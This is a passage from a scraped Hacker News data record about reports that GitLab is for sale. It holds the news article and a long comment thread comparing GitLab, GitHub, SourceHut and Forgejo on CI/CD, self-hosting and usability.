facilities, and research funds to be kept and spent separately. I would like to know some examples of how recent, publicly funded PhD, masters degree and postdoc work or research has materially advanced or will advance our world's knowledge and progress and has resulted in material benefits to society, and not just unreproducible studies on paper and unviable technologies and products. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A study using the James Webb Space Telescope (JWST) has intensified the debate over the Hubble tension, a discrepancy in measurements of the universe's expansion rate.",
      "Two research teams, led by Adam Riess and Wendy Freedman, have conflicting results: Riess' team measures a higher expansion rate, while Freedman's team finds values closer to theoretical predictions.",
      "Freedman's recent JWST analysis yielded mixed results, suggesting systematic errors in distance measurement methods rather than new physics, leaving the Hubble tension unresolved."
    ],
    "commentSummary": [
      "The Webb Telescope has intensified the Hubble tension controversy, questioning whether the universe is expanding and exploring alternative explanations for redshift.",
      "Discrepancies in measuring the Hubble constant suggest potential errors in distance calculations or flaws in the current cosmological model.",
      "Researchers are divided between developing new models and refining existing measurements, underscoring the complexities and evolving nature of cosmology."
    ],
    "points": 155,
    "commentCount": 114,
    "retryCount": 0,
    "time": 1723553454
  },
  {
    "id": 41231735,
    "title": "Gitlab is reportedly up for sale",
    "originLink": "https://www.developer-tech.com/news/gitlab-is-reportedly-up-for-sale/",
    "originBody": "GitLab is reportedly up for sale About the Author By Muhammad Zulhusni18th July 2024 Categories: Artificial Intelligence, Developer, Development Tools, As a tech journalist, Zul focuses on topics including cloud computing, cybersecurity, and disruptive technology in the enterprise industry. He has expertise in moderating webinars and presenting content on video, in addition to having a background in networking technology. GitLab has reportedly garnered interest from buyers and is considering a sale. As AI and cloud computing fuel acquisitions in the technology sector, these mergers and acquisitions are increasingly under review. Company overview and market position At a valuation of about $8 billion, GitLab has positioned itself as an essential player in the software development space. Its platform automatically integrates various tools and provides a common tool for software design by development, operations, and security teams. GitLab has over 30 million registered users and is used by over half of the Fortune 100 companies, making it a significant player in this space. Interestingly, GitLab’s headquarters are based in San Francisco, but it runs as a completely remote company with all its employees working from different parts of the globe. This unique structure has helped position GitLab as a tech industry trailblazer in the remote work movement. People familiar with the matter said GitLab has engaged investment bankers to help. There are several prospective buyers in the mix for the company, but apparently, there may now be a leading candidate—cloud monitoring firm Datadog, with a market value of $44 billion. Its customer-service software allows computer programmers and others to work together using cloud-based tools while keeping tabs on their productivity, especially when more people work remotely. The chances of a deal are said to be weeks away, if not non-existent. The confidential nature of these discussions highlights just how thorny and high-stakes negotiations with tech giants can be. The impact on GitLab’s stock has started: Shares initially surged as much as 11.5% before settling for a gain of around 7% in midday trading when news first broke that the company was exploring options, sources said. The fact that the stock responded in this way implies that investors, for one, saw a sale as good news. Needham analyst Mike Cikos said the acquisition has been anticipated for years. This may seem somewhat counterintuitive to many investors, perhaps thinking of companies like AWS and Google Cloud as much more likely buyers. However, Cikos sees synergies between GitLab and Datadog, showcasing the combination in scale-ups that have caught some by surprise in tech sector consolidations. Competitive landscape and challenges Given its position in the market, GitLab still faces significant challenges. The company’s shares have fallen 16% this year as investors worry about potential cuts in customer spending. In contrast, the S&P 500 Application Software index rose nearly 3% over the same period. GitLab has sharp rivals to contend with, including Microsoft, which, thanks in no small part to its 2018 purchase of GitHub for $7.5 billion. Consequently, this competitive pressure has also presented pricing headwinds for GitLab, as reported in the company’s most recent financial statements. The San Francisco-based company’s last reported revenue was $169.2 million, up 33% from the same period a year earlier, for its last quarter, and it announced it was cash flow-positive for the first time ever. However, the company also disclosed the pricing headwinds it is facing as competition increases in its industry. GitLab’s unique ownership structure makes the possibility of a deal even more fascinating. The founder and CEO, Sid Sijbrandij, retains 45.51% of the voting stock via dual-class shares. This further complicates any potential deal because Alphabet — Google’s parent company, which includes a venture capital arm — maintains a 22.2% voting stake in GitLab. Industry trends and broader context A sale of GitLab would be part of a broader wave of consolidations in the tech sector. According to Dealogic, in the first half of 2024, the technology sector accounted for the highest share of global M&A activity, involving $327.2 billion worth of deals. This represents a substantial year-on-year increase, with the sector’s deal value jumping by just under 42%. Such a prevalence of M&A deals is motivated by the necessity for companies to broaden their range of offered services due to the quickly changing landscape of global business with significant players in numerous industries, from artificial intelligence to cloud computing. For instance, the technology conglomerate Alphabet is said to have been in advanced talks to purchase cybersecurity upstart Wiz for an estimated $23 billion. Previously, Alphabet was rumoured to have considered a purchase proposal for the marketing software maker HubSpot. The tech industry is consolidating, and GitLab’s potential sale would be one of the largest events in software development tools and cloud services this year. Whether this particular deal occurs or not, and what its implications for the technology community at large are, remains to be determined. (Photo by Pankaj Patel) See also: GitLab update addresses pipeline execution vulnerability Looking to revamp your digital transformation strategy? Learn more about Digital Transformation Week taking place in Amsterdam, California, and London. The comprehensive event is co-located with AI & Big Data Expo, Cyber Security & Cloud Expo, and other leading events. Explore other upcoming enterprise technology events and webinars powered by TechForge here. Tags: development, google View Comments Leave a comment Leave a Reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Website",
    "commentLink": "https://news.ycombinator.com/item?id=41231735",
    "commentBody": "Gitlab is reportedly up for sale (developer-tech.com)148 points by walterbell 16 hours agohidepastfavorite163 comments theappsecguy 3 minutes agoHopefully someone decent buys it and reshapes the direction without major layoffs. I use GitHub because there is no compelling reason not to and that’s what we have at work. But GitHub is stagnating and I have the idea of them having even more market share. Their AI propaganda is also insane. reply keyle 14 hours agoprevIt's kind of a poisoned well situation. Whoever would purchase them would lead to the departure of many disgruntled users who basically were with Gitlab to stick it to Microsoft. I've also never felt compelled to use Gitlab. They literally offer no significant advantage other than being an alternative to Github. If I started over, I'd go with Drew's Sourcehut hub for the sake of actually shooting for something different. I don't really see who would pay $8B for this business which has no moat-future. reply The_Colonel 14 hours agoparentGitlab, GitHub and SourceHut are remotely comparable only if you care just about source code hosting. But Gitlab (and partially GitHub) is so much more - it grew to a beast trying to do everything for your project - project management, CI, analytics, communication... It's not for everyone, but for e.g. startups buying an all-in-one solution could be attractive to reduce the effort on getting all development tools set up and integrated. reply krasin 14 hours agorootparentSourceHut has an issue tracker (incomplete, but very fast) and CI. The problem is that SourceHut is not becoming any better over time. With all my respect to Drew, his attention is spread too thin over many projects. reply a-french-anon 11 hours agorootparentYep, as a paying customer, I'm still waiting for a way to reach each project page from any other page. Literally the easiest thing to make in the world, but still in limbos... As for Gitlab and Github, I left ridiculous Jabbascript abominations behind and never looked back; Github now overriding usual keys like PageUp/Down and Home/End SPA style and not being able to display most stuff without JS is the straw that broke the camel's back for me. reply packetlost 5 hours agorootparentI'm not saying I don't agree, but I'm sure they would accept contributions implementing such a feature. reply shihab 13 hours agorootparentprevMay I ask what does “very fast” mean in the context of an issue tracker? reply krasin 13 hours agorootparentIt means that it's not slow. Case in point: Jira. reply _nalply 13 hours agorootparentIt means that user feels the user interface is quite responsive. It's not a very useful metric. A user having a flaky internet connection with high latency and low bandwidth and intermittent disconnections would complain that the platforms he uses are \"slow\". Or a service is just bogged down by too many users but would be quite responsive if not overloaded. EDIT: I was not writing about JIRA specifically. I agree that JIRA is ALWAYS slow. Ten years ago I had to wait five seconds after a button click. However I also had to handle a complain that something was slow just because that customer's internet was shit. EDIT 2: I remember ten years ago an especially perverse variation. A friend of mine was complaining about the bad quality of video even after having upgraded his internet connection. The problem was asymmetric bandwidth. His friend had bad upstream and my friend just saw jerky movements and ugly artifacts and it was unusable for communication in a Signed Language. I learnt that day: if something is slow, then it is not always easy to understand why. My friend was very disappointed in me. reply creshal 13 hours agorootparentJira is slow all the time. Sourcehut might, potentially, in contrived circumstances be at risk of becoming slow, but it's so well optimized that it's an outside risk, rather than a guarantee. Surely you understand the difference between the two categories of software? reply xigoi 8 hours agorootparentprev> A user having a flaky internet connection with high latency and low bandwidth and intermittent disconnections would complain that the platforms he uses are \"slow\". On the contrary, a bad internet connection makes it much easier to distinguish slow and fast platforms. reply Gud 3 hours agorootparentCase in point: hacker news is almost always working fast for me, no matter what crappy internet connection I’m on. reply rgreekguy 13 hours agorootparentprevI remember reading SourceHut's creator, Drew, has some controversy around him... reply krasin 12 hours agorootparentEveryone doing anything has some controversy around them. At some point, we should just stop paying attention to internet dramas and focus on what matters. Like, fast issue trackers or continuous build with a novel feature to ssh into the state, when the build failed (which SourceHut supports: https://man.sr.ht/builds.sr.ht/build-ssh.md) reply stavros 11 hours agorootparentGitlab does too, IIRC. reply AceJohnny2 11 hours agorootparentprevHe is opinionated. Scroll through his blog, and I'm sure you'll find something to disagree on: https://drewdevault.com/ reply packetlost 5 hours agorootparentIt's fine to be opinionated, but he's also very abrasive and you don't have to go far to find people who have had a bad experience with him at some time or another. That being said, I haven't seen anything egregious for a couple of years, so maybe he's taken some of the honest feedback to heart. reply dogsledsleddog 7 hours agorootparentprevFor Github there's a sort of moat that it needs to work across IDEs, orgs, random people, etc. For Gitlab any org using it can harmonize on an IDE and the IDE can slowly introduce all of the CICD/collab with much better code quality and user experience than Gitlab since they rushed to copy Github rather poorly. reply attendant3446 4 hours agorootparentprevYes, the beast. It's a monstrous thing that does everything and nothing particularly well. reply Justsignedup 13 hours agorootparentprevAfter using gitlab for a year I can boldly claim that it is inferior to github in every feature with subtle things being better in github which add up to a far better experience. Gitlab tries to do a lot and never did anything that well. It's just perpetually catching up to github. reply raffraffraff 12 hours agorootparentHaving used both for about 9 years I would say that's not correct at all. Github may have beaten Gitlab to the punch with Pages (whoopee) but CI is a far more important feature, and Gitlab CI existed for years before GA, and continued to be a far superior solution for a long time (and maybe it still is?). Also, because Gitlab targeted enterprises they had a bunch of features that Github did not. Self hosting, Identity and role based access, weighted issues, project milestones and burndown charts, private issues, support for \"innersourcing\" of internal repositories. The list goes. Unlike Pages, which is useful but can be replaced by any other wiki, things like role based access to projects are really important. When I switched jobs a few years ago and had to use Github, it felt more like a hobbyist's web-based toy version, lacking a lot of \"big-boy\" features. The one truly essential feature that separated them \"for the 99%\" was CI. Once Github introduced that, it shrunk Gitlab's lead. But Gitlab are by no means playing catchup to to Github. reply moltar 9 hours agorootparentWholly agree with you. I’ve been using both professionally for years in parallel and have seen the evolution. Totally agree on CI being superior. The config syntax is a bit of a pain and is aching for some higher level abstraction. But it’s very powerful, e.g. easily supporting cross project dependencies and build status across project in one neat interface. I also agree that GitLab was optimized for enterprise and that’s where the major feature disparity is. If you are using it only for small hobby projects you will feel that it’s nothing special. I’ve used a self hosted version at a fortune 100 and it was a huge boon to productivity there over GH EE. reply Qerub 7 hours agorootparent> aching for some higher level abstraction CI/CD components (GA since 17.0) improve the situation a notch: https://docs.gitlab.com/ee/ci/components/ reply trueismywork 5 hours agorootparentAlso CI/CD steps reply trueismywork 11 hours agorootparentprevYes. Gitlab CI is still miles ahead of github. reply chipdart 13 hours agorootparentprev> After using gitlab for a year I can boldly claim that it is inferior to github in every feature with subtle things being better in github which add up to a far better experience. I find this remark baffling by how much it contrasts with reality. Others in this thread already commented on GitHub using terms like \"mediocre\". I wouldn't go that far but I am indeed aware that GitLab feels it works and is expected to work reliably, specially CICD which, unlike GitHub, they succeeded in turning it into a solved problem. It's even more baffling reading bold claims like \"Gitlab tries to do a lot and never did anything that well\" when only a couple of years ago GitHub Actions were renowned for not even being prod-ready,whereas GitHub CICD just works and works well without requiring investing any thought into it at all. reply jaredklewis 11 hours agorootparentThe parent's post aligns with my own experience. I've been using GitLab for 2 years after switching companies and I can't think of anything that is an improvement over GitHub. I never had any issues GitHub Actions for CI stuff at my previous two companies, both which used it heavily. GitLab CI also works fine, though I struggle to see how anyone could strongly prefer one or the other as my own experience is that they basically work the same. Both basically boil down to some yaml you can use to configure running stuff in docker containers. reply seba_dos1 3 hours agorootparentThe point is that it was GitHub that caught up for some simpler use-cases fairly recently, not the other way around. When I started using GitLab 6 years ago it made GitHub look like a toy where you had to reach for external services like Travis to do anything useful. reply jaredklewis 16 minutes agorootparentFair enough, but the fact that GitLab was better 6 years ago doesn't do much to help the company right now. I wasn't using GitLab 6 years ago so I can't comment on that, but I can comment that at least since 2022, I haven't found anything in GitLab that would recommend it over GitHub. reply pas 5 hours agorootparentprevthe rabbit hole goes deep, but both GitLab and GitHub reached parity around that time. (initially GitLab CI simply did a lot more, then GHA kind of took over with the ability to run multiple parallel workflows, and by arguably feeling a bit newer and having better \"official\" steps ... the GitLab auto-magic CI was ... always completely meh, IMHO.) but GitLab kept adding the good stuff that Actions introduced, and it can do a lot of things, and with the Omnibus package it's very easy to self-host. (and upgrades are well supported, etc.) ... and of course GitHub self-hosting is only for enterprise editions. sure, you can setup one GHA Runner on one VM (and each one one a new one), but that's it. nothing else is supported officially. reply thiht 6 hours agorootparentprevHow is CI not a solved problem with GitHub Actions? I used and loved GitLab CI years ago and remember it feeling better to use than GHA (though maybe I’m remembering through rose tainted glasses), but GHA are just working nowadays, and the ecosystem of pre-made Actions is in good shape. reply pas 5 hours agorootparentnope, GHA is still clunky. self-hosting GHA Runners (plural!) is ... hard (not impossible, and quite doable with enough investment, especially if one takes the dive into the murky waters of k8s), but it's not officially supported. (what's supported is here's a tarball we support these distros ... have fun.) programming in YAML is still bad, composability is still an afterthought, etc. reply thiht 2 hours agorootparentFor hosted runners that might be true. The best experience I’ve had with GHA self hosted runners was simply using a beefy VPS. At my current job, the self hosted runners were hosted on K8s using Arc and it was a… very unpleasant experience. We switched back to GH runners (turns out the free minutes + a few bucks a month is enough for our use case), but if we need to go back to self hosted I’ll advocate for a VPS. > programming in YAML is still bad, composability is still an afterthought, etc. I disagree on that. GitHub actions are as composable as it gets thanks to the ecosystem of actions. GHA is better than GitLab CI in this regard, and probably the best system I’ve used so far. It IS a bit clunky but overall I’ve been pretty satisfied with it. I also disagree regarding YAML because you don’t program a CI, it’s mostly declarative work. The only conditions needed are a bit clunky to setup, I give you that, but it encourages to either keep the CI simple (no CI needs overly complex conditions), or move the logic to CI scripts in any scripting language. reply suryao 1 hour agorootparentThought I'd plug my product because of the mention of actions-runner-controller on k8s. I wouldn't wish that on my worst enemy :) It is a terrible experience riddled with many gotchas. I'm making WarpBuild to provide runners (cloud and BYOC on user's aws account) to provide more powerful, faster, and overall much better experience. Try us out - you're guaranteed to save both money and time. reply Gigachad 13 hours agorootparentprevPre Microsoft I felt Gitlab was a lot better. It had a lot more features that actually worked. This was an era where Github didn't even have a built in CI solution. Last time I used it, which was a few years ago now, it felt like Github had caught up and a lot of the Gitlab features were flaky or didn't seem to serve any purpose other than checking a sales tick list. Stuff like integrations that don't seem to really serve any purpose other than to say they are integrated. reply chipdart 13 hours agorootparent> Stuff like integrations that don't seem to really serve any purpose other than to say they are integrated. I don't think integrations are the example you think it is. The ones I tried work well and make it trivial to setup features that would otherwise feel like papercuts. I'm talking about things like being able to handle gitlab events without having to manage anything or provide your own event-handling infrastructure. If you have web hooks you need invoke or react to, as anyone who runs full CICD and cares about blocked pipelines does, with GitLab you don't need to worry about exposing custom endpoints and write controllers. For many, that is the difference between using notifications or not. reply NewJazz 13 hours agorootparentprevYou can't pull a docker image from a private github container registry without a personal access token. Gitlab's group and project level deploy tokens are great. reply ffsm8 13 hours agorootparentprev> It's just perpetually catching up to github. That's not how I remember it. I agree that GitHub is ultimately the more polished product, which is why I eventually went back with my personal projects to it... But most of these platform features like CI Integrations, project repositories etc started at gitlab, and GitHub effectively copied them later reply stavros 11 hours agorootparentMany, many years later. reply tracker1 2 hours agorootparentprevI think the Gitlab experience is slightly better when dealing with collaboration on private repositories with multiple people not necessarily in the same org. Also, Gitlab had free private repo support beyond what Github offered for a long time, so most of my private repos are on Gitlab. reply smallerfish 13 hours agorootparentprevCreate a hierarchy of branches/PRs: z > y > x. Merge y. Gitlab will automatically retarget z to x; GitHub will orphan z. I do wish Gitlab would spend some time better organizing their settings menus, but aside from that it seems to be more complete. reply viraptor 12 hours agorootparentI'm not sure when it changed (sometime this year?) but GH automatically changes the PR base now. reply jamie_ca 2 hours agorootparentI do stacked PRs for complex changes, and Github has been updating branch bases to support this workflow for at least two years now. reply ankitdce 5 minutes agorootparentThere are a few free open source tools available these days to manage the stacked PRs. Eg: https://github.com/aviator-co/av preisschild 13 hours agorootparentprevBeen using both for years, and there are definitely CI and CD features that are very great in Gitlab and even better than some Github features reply brnt 10 hours agorootparentprevGitea/Forgejo also has much of that these days. reply omnimus 10 hours agorootparentWhile being neat binary+sqlite which is turns out tobe enough even for big orgs. reply brnt 10 hours agorootparentYou don't have to use sqlite. reply voidr 13 hours agorootparentprevWhat is so difficult in setting up and integrating GitHub with Jira for example, last time I did it, it was a few clicks? GitHub also has mediocre issue management and a wiki and we have GitHub Actions as well. You still need to integrate your cloud service provider with GitLab, which is exactly the same hassle as integrating it with GitHub. reply levidos 14 hours agoparentprevAs DevOps engineer I've used and managed both Gitlab and Github extensively, and Gitlab is just so much better. Things make sense there. Shame that it's so darn expensive. reply silisili 14 hours agorootparentSame. Been using Gitlab for years, but joined a new company using Github. I was appalled by how bad everything is compared to Gitlab, but especially ci/runners vs actions. reply cyberpunk 14 hours agorootparentDoes gh actions even support k8s native runners yet? reply Qerub 7 hours agorootparentLooks like it: https://docs.github.com/en/actions/hosting-your-own-runners/... reply danpalmer 14 hours agorootparentprevWhen you say managed, do you mean self hosting, or do you mean using the platforms for devops? I can see how GitHubs self hosting story might be worse, because it’s just not designed for that, most companies don’t do it anymore, and I believe the product is deprecated. As for doing devops from the platforms, I always found GitHub Actions better than GitLab CI, but I realise many feel the opposite. reply cortesoft 14 hours agorootparentprevAgreed, used to manage our GitHub enterprise and then lead the transition to Gitlab enterprise. Both cheaper and better, and open source. reply p4bl0 13 hours agoparentprev> They literally offer no significant advantage other than being an alternative to Github. I can self-host the community edition for free, and in addition to use it as a software forge and static websites hosting and deployment platform through GitLab Pages, I can use it to manage my users and have third-party services (like mattermost, hedgedoc pads, and other internally developped apps) for centralized login. I really really hope that the buyer will keep the Community Edition alive, otherwise we'll have to move everything over to something else (I don't know what yet). reply juliangmp 10 hours agorootparentFor self hosting I'd take a look at sourcehut or forgejo. They're fully open source instead of \"open core\". disclaimer: While I'm not directly involved with forgejo, I am part of Codeberg e.V., so consider that to be kind of an ad. reply myworkinisgood 10 hours agorootparentprevIf you are using it for work, then it might be better to make everything paid. That would probably also reduce the cost per user, because we would have more users. reply NewJazz 5 hours agorootparentI'd still prefer self hosting CE, but this may be an option for you if it comes to it: https://about.gitlab.com/solutions/education/join/ reply p4bl0 7 hours agorootparentprevPer-user prices would be way to expensive. Thé self-hosted GitLab instance I manage is used for teaching and research. We don't use it to make money in any sort of way. We don't have the budget to pay for it. If we have to pay in the future we'll just (painfully) switch to another solution. reply chrisandchris 13 hours agoparentprev> They literally offer no significant advantage other than being an alternative to Github. They literally offer self-hosting at the same price as the SaaS version, which is still significant to some of us. I'll go rather go back to paper than to just move every last bit of my companies data into the hands of a single company (looking at you, Microsoft). reply chipdart 13 hours agorootparent> I'll go rather go back to paper than to just move every last bit of my companies data into the hands of a single company (looking at you, Microsoft). To me, given he critical importance of a working CICD, it feels like Microsoft controlling both GitHub Actions and Azure Pipelines poses a significant risk of having the proverbial rug pulled from under you. I don't expect Microsoft to invest on GitHub Actions enough to make them the clear winner in UX and cost, for example. Both Azure Pipelines and GitHub Actions are appallingly bad in UX, at least compared to GitLab CICD or even CircleCI or Travis, and I don't expect to turn that around due to their incentives to not make either one too competitive regarding the other in-house service. But that's just me. reply chrisandchris 12 hours agorootparentI wholeheartly agree! The two best CI tools I've ever seen were Gitlab, as its approch was just working good (tm) and Teamcity, as its approach with the UI & Kotlin integration was just nice. Then I've seen Azure Pipelines, which seem like an unfinished product because it competes with Github Actions, and then there is Github Actions which seem to come from someonw who loves to write k8s yml files (they do what they do, but they're unreadable). reply nox101 12 hours agorootparentprevWhat makes Github Actions UX bad and what makes Gitlab CICD/CircleCI/Travis good? I've used 3 of those but I guess not enough to prefer one over another. reply chrisandchris 11 hours agorootparentNot GitHub Actions but Azure Pipelines: The sheer endlessness of logs, even for the smallest tasks there are hundreds of lines of logs, and it's nearly impossible to find the line you need if something went wrong. reply fsckboy 14 hours agoparentprev> They literally offer no significant advantage other than being an alternative to Github so you use Github? if they're the same, why not use the alternative? I just don't understand your negativity given that you don't list any negatives reply vlaaad 12 hours agorootparentNot the parent, but I'll bite: they are not the same. GitHub offers significant advantages over Gitlab, while Gitlab doesn't. Therefore I use GitHub. Once upon a time Gitlab had an advantage: they allowed private repo hosting for free. Now it's gone. reply chipdart 13 hours agoparentprev> I've also never felt compelled to use Gitlab. They literally offer no significant advantage other than being an alternative to Github. I completely disagree. GitLab undoubtedly has the best CICD service. GitHub Actions feel poorly designed and half-baked in comparison to the point they barely feel prod-ready. It's interesting to read into the thought process of anyone picking GitHub vs GitLab, because, other than being the default with tolerable shortcomings beyond copilot, there is no compelling reason to pick GitHub. If anything, GitLab's Achilles heel is it's massive Product Management problem. I recall that access to some features like Group Access Tokens were unexplainably removed from free access without updating documentation or even it's UI. Apparently some GitLab PM made a call to pull them out without bothering to check for the customer impact loose ends, and all loose ends were simply left in place for customers to repeatedly pester support without any action. reply tempay 12 hours agorootparentI use both extensively and lean towards to opposite statement, though not as strongly. GitHub Actions feels much more well thought out to me. The templating feels less hacky and the workflows via \"uses\" work really nicely for abstracting common bits of CI config into \"packages\". The downside is that GitLab CI feels easier to pick up and explain. On the opposite side, GitLab CI feels like it was made for containers and k8s whereas GitHub Actions feels like it's just a VM (even if the runner software is technically more flexible than that). From a management perspective GitLab is nicer but as a user I often want to avoid thinking about any of the k8s quirks and just have an emphemerial VM to play with. reply danpalmer 14 hours agoparentprev> They literally offer no significant advantage other than being an alternative to Github. While I agree with most of your point, I'd suggest that being self-hosted is a fairly major draw for a certain group of people. There's a lot of overlap with the anti-MS cohort, but it's not exclusive. Most of the uses I've seen of GitLab in companies is those who stick it on a cheap VM and never pay for it. GitHub has had a self-hosted offering in the past, the current availability is... cloudy, looks discontinued, they're trying to move people back online. It was always way more expensive though, targeting a completely different market to GitLab self-hosting. reply j16sdiz 14 hours agorootparentGitHub enterprise server[1] still exists. [1] https://docs.github.com/en/enterprise-server@3.10/admin/over... reply ReleaseCandidat 14 hours agoparentprev> I'd go with Drew's Sourcehut hub for the sake of actually shooting for something different. Or Codeforge (Forĝejo, if self hosting). reply Banditoz 13 hours agorootparentGitea/Forgejo seem pretty snappy and lightweight (on the UI side at least. Reminds me of old GitHub before they went all in on clientside rendering) reply ReleaseCandidat 12 hours agorootparentIt is, it's running fine as a mirror of my Codeberg and Github repos together with Postgres in a RISC-V Qemu VM running Debian, using less than 500MB. reply trustno2 13 hours agoparentprevgitlab is much more digestible for companies that want to self host. But at that point GitLab the company gets no money... no corp will use sourcehut. That's just outside of the possibility. And corps have the most money. reply chrisandchris 13 hours agorootparentWhy does it get no money then? The pricing is the same. reply preisschild 13 hours agorootparentprevGitlab Enterprise Edition can also be self hosted and they do take a lot of money for it :) reply metadat 13 hours agoparentprevI tried to register for sirhat today and was told I was flagged and should go through a manual process. Too bad, I like Drew and am benign (despite the skanky username). Username: sleaze / sleae reply chillfox 12 hours agoparentprevTheir self hosted offering was really good some time ago. I feel like the peak was just after they added CI. Then it got bloated. If you are trying to introduce source control to a traditional org that haven't been using it ever, then a self-hosted option with CI is a much easier sell than something in the cloud (in my experience). reply JoshTriplett 13 hours agoparentprev> I've also never felt compelled to use Gitlab. They literally offer no significant advantage other than being an alternative to Github. They have exactly three advantages over Github: 1) Ability to self-host. 2) Open Source core (if you carefully avoid all the proprietary features). 3) https://xkcd.com/918/ reply voidr 13 hours agorootparentSounds good on paper, but in reality you still need to pay the insane licensing fees if you need a usable product. It's like Android, I can download the source code and run it as long as I don't need extra features like a dialer and I don't mind majority of the Android apps not running on it. If you need a truly open source solution then that would be Gitea not GitLab. reply Volundr 3 hours agorootparent> Sounds good on paper, but in reality you still need to pay the insane licensing fees if you need a usable product. Can you clarify what you mean by this? I ran a hosted Gitlab instance for a previous company for years with SSO, actions, container registry, on Gitlab CE. I never felt like I was missing anything. While I'd definitely reach for Gitea if I wanted to be a purist about open source I honestly can't think of a Gitea feature that's not in Gitlab CE. reply trueismywork 11 hours agoparentprevFor any kind of usage that needs github enterprise server, gitlab is a more viable solution in future. Software development infrastructure is important enough and complex enough that a single closed source solution cannot solve all problems. reply OutOfHere 12 hours agoparentprevBitbucket is alive and well, by the way, and should warrant consideration too. reply keyle 11 hours agorootparentI used it at work. It's just so damn slow and silly. But it does work and gets the job done. reply foooorsyth 14 hours agoparentprev>They literally offer no significant advantage other than being an alternative to Github. Gitlab had many features first. Namely, they had integrated CI way before GitHub did. Their open CI runners are really cool and easy to setup. GitHub had to scramble to put out their Actions product to compete. I don’t know what the feature comparison looks like today, but many of the innovative features you probably use on GitHub were on Gitlab first. They had a way more innovation velocity for quite a while. reply wtcactus 12 hours agoparentprevThey have a lot of advantages over GitHub as soon as you go beyond the simple task of hosting code and managing git workflow. The main one are CI/CD Pipelines fully baked in: This is huge. It's fully integrated in the platform. You have full visibility over the CI/CD pipeline. You can even use their own runners. reply hdjjhhvvhga 8 hours agoparentprev> They literally offer no significant advantage other than being an alternative to Github. In most large orgs I worked for they used Gitlab as their main platform (even though they had uses for GitHub too) for the main reason: they could host it whenever they wanted it and how they wanted, as opposed to GitHub where the only thing you can control is runners. reply globular-toast 11 hours agoparentprevGitlab CI/CD is miles ahead of GitHub. GitHub is full of magic that you can't debug locally. Gitlab just makes sense and it's purely an orchestrator for stuff you can run locally. reply sebazzz 4 hours agorootparent> Gitlab just makes sense and it's purely an orchestrator for stuff you can run locally. The best CIs are exactly that. Just a task runner, with some reporting capability. Even the reporting capability Github is not very good at. reply xyst 14 hours agoprevEvery time GL is mentioned, I am reminded of the 2017 incident where a person 'rm -rf' the primary pg data logs. The reenactment by Kevin Fang is always a good source of comedy on a bad day. https://youtube.com/watch?v=tLdRBsuvVKc It’s a shame they are selling out, but I suppose it was bound to happen sooner or later. GH is vacuuming up all of the market share. I kind of liked the ability to self host my own GL. But for small/personal use cases. It was a bit overkill. reply otabdeveloper4 11 hours agoparentGitea is what you want. Gitlab is for when you want to self-host a godawful corporate \"CI/CD pipeline\". reply kevindamm 14 hours agoparentprevmm that's a good postmortem reply taspeotis 14 hours agoparentprevAlso the hoops they jump through to avoid “pull request” even though the term is native to Git. Like did calling it a “merge request” trick everyone into believing they weren’t a GitHub clone in the early days? reply commodoreboxer 13 hours agorootparent\"pull request\" isn't really native to git. \"pull\" is. A pull request is literally sending somebody a message and requesting that they pull a branch from your fork and merge it. A \"pull request\" in GitHub doesn't really do a pull under the covers at all. \"pull request\" is a more recognizable term, but \"merge request\" is more technically accurate for what GitHub and GitLab do. And is it really jumping through hoops to just name it something different? I usually think of that phrase as implying something more arduous. reply taspeotis 13 hours agorootparenthttps://git-scm.com/docs/git-request-pull reply commodoreboxer 13 hours agorootparentThat's a convenient generator for pull requests, sure, but a pull request is still a human mechanism, not a git mechanism. The \"pull request\" itself is still just a message requesting a pull, not some concept that git (either the commands or on-disk representation) is specifically aware of. To that point, GitHub still does not use git-request-pull or even pulls to implement PRs, so the name is still not correct there. GitLab's naming is more accurate. reply NewJazz 13 hours agorootparentprevYou just linked a shell script that writes an email. reply seba_dos1 2 hours agorootparentprevIt came first, but what GitHub called \"pull requests\" is very unlike what git does here. Even Torvalds famously ranted about that. \"Merge request\" is a much better name for what GitHub actually does. reply anal_reactor 11 hours agorootparentprevI just think we should have standardized naming conventions in order to allow clearer communication, while the CS field is moving exactly the opposite way because every company wants to have their own, unique nomenclature. This is ridiculous and only creates friction. Imagine mathematicians having ten different names for \"a curve\", half of them considered offensive because why not. reply xigoi 8 hours agorootparent> Imagine mathematicians having ten different names for \"a curve\", half of them considered offensive because why not. You’d be surprised to learn that mathematics has at least three different names for a function. reply OccamsMirror 13 hours agorootparentprevIn fairness, \"merge request\" is easier to understand. reply vander_elst 13 hours agorootparentprevI think merge vs pull is a different development workflow, which might appeal different organizations, tbh I never liked much the need of forking the entire repository to be able to contribute. Gerrit also doesn't require you to fork the repo first. Anyway, from my perspective that's s feature that GL provides vs GH, not just marketing. reply tracerbulletx 15 hours agoprevWhy can so few medium sized software companies succeed in the long term anymore? Why does everything need to consolidate to just a few companies. reply toomuchtodo 15 hours agoparentBecause that’s the TAM without enterprise cross sell, which you only get once sucked up into the spaceship. Teams, GitHub, with Microsoft, Slack with Salesforce, Hashicorp with IBM, and so on. You either grind and love the grind, and make peace with your slice of the industry (Automattic [$7.5B value], for example) or you sell out and up when you get bored or tired. reply ThrowawayR2 14 hours agorootparentI asked this elsewhere but didn't the founders show up on HN threads when Gitlab first launched and insist they had no plans to ever sell out? reply metaphor 13 hours agorootparentSometimes life deals you a really bad hand[1]. [1] https://x.com/sytses/status/1797763994834600207 reply toomuchtodo 13 hours agorootparentAbsolutely terrible news to hear. reply rapsey 15 hours agoparentprevIf they take VC money there are only two possible end goals. Go public or get bought. VC investment needs to be payed back. reply toomuchtodo 14 hours agorootparentGitlab went public October 14th, 2021. https://finance.yahoo.com/quote/GTLB/ https://news.ycombinator.com/item?id=33208536 https://news.ycombinator.com/item?id=28863993 reply lagniappe 14 hours agorootparentprevAll investment must be recouped, even in a purchase. 8B is a proud sum and it'll be attempted to be extracted from the users first. This is the beginning of the end, as we have seen over and over again. reply Jensson 13 hours agorootparentSo time to move all stuff you have on gitlab somewhere else, that way it will be easier when they change the terms. reply preisschild 13 hours agorootparentMany things in gitlab, like their many project planning features & CI+CD, dont really have self hosted alternatives... reply NewJazz 12 hours agorootparentYou can self host gitlab. If they ever stop releasing open source code, someone will fork the last community edition. reply candiddevmike 14 hours agoparentprevBecause GitLab couldn't be bothered to be a great, reliable, focused, self-hosted code development and CI/CD solution. They had to tack on half-baked copies of every dev tool in existence. reply pas 5 hours agorootparentThey are a great reliable pretty focused self-hostable dev/devops platform with a lot of trendy shit as extra. Most of which you get for free... they executed the open core model as well as possible (in this sector). What do you think they should have done better that would have 